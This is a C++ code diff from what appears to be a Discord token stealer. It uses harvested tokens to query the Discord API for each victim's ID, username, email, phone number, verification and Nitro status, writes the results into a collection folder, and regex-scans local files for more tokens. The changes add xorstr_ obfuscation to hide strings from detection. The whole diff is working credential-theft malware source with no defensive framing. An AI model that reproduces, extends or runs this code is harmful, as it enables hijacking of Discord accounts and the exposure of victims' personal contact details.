@@ -7,27 +7,28 @@
 void Discord::execute(fs::path &root) {
     for(const std::string& token : this->getTokens())
     {
-        Discord::writeTokenInfo(token, root / "Discord");
+        fs::path discordRoot = root / xorstr_("Discord");
+        Discord::writeTokenInfo(token, discordRoot);
     }
 }
 
 void Discord::writeTokenInfo(const std::string& token, const fs::path& root) {
 
-    std::pair<std::string, int> request = HttpUtils::sendHttpRequest("https://discordapp.com/api/v6/users/@me", "Content-Type: application/json\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\nAuthorization: " + token);
+    std::pair<std::string, int> request = HttpUtil::sendHttpRequest("https://discordapp.com/api/v6/users/@me", "Content-Type: application/json\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\nAuthorization: " + token);
     if(request.second != 200)
         return;
 
     json resp = json::parse(request.first);
     std::stringstream ss;
-    ss << "ID: " << resp["id"] << "\n";
-    ss << "USERNAME: " << resp["username"] << "\n";
-    ss << "GLOBAL NAME: " << resp["global_name"] << "\n";
-    ss << "LOCALE: " << StringUtils::toUpperCase(resp["locale"]) << "\n";
+    ss << "ID: " << std::string(resp["id"]) << "\n";
+    ss << "USERNAME: " << std::string(resp["username"]) << "\n";
+    ss << "GLOBAL NAME: " << std::string(resp["global_name"]) << "\n";
+    ss << "LOCALE: " << StringUtil::toUpperCase(std::string(resp["locale"])) << "\n";
     ss << "\n";
     ss << "VERIFIED: " << ((resp["verified"] == true) ? "Yes" : "No") << "\n";
     ss << "";
-    ss << "EMAIL: " << resp["email"] << "\n";
-    ss << "PHONE: " << resp["phone"] << "\n";
+    ss << "EMAIL: " << std::string(resp["email"]) << "\n";
+    ss << "PHONE: " << std::string(resp["phone"]) << "\n";
     ss << "\n";
     ss << "NSFW ALLOWED: " << ((resp["nsfw_allowed"] == true) ? "Yes" : "No") << "\n";
     ss << "\n";
@@ -35,7 +36,7 @@ void Discord::writeTokenInfo(const std::string& token, const fs::path& root) {
     ss << "";
     ss << "NITRO: " << ((resp["premium_type"] == 1) ? "Yes" : "No") << "\n";
 
-    std::string bio = StringUtils::replace(resp["bio"], "\n", " ");
+    std::string bio = StringUtil::replace(std::string(resp["bio"]), "\n", " ");
     if(!bio.empty())
     {
         ss << "\n";
@@ -175,7 +176,7 @@ std::vector<std::string> Discord::scanToken(fs::path &root, const std::vector<BY
             if(content.empty())
                 continue;
 
-            for(std::string &line : StringUtils::splitString(content, '\n'))
+            for(std::string &line : StringUtil::splitString(content, '\n'))
             {
                 line = std::regex_replace(line, std::regex(R"(\s+$)"), "");
                 std::smatch match;
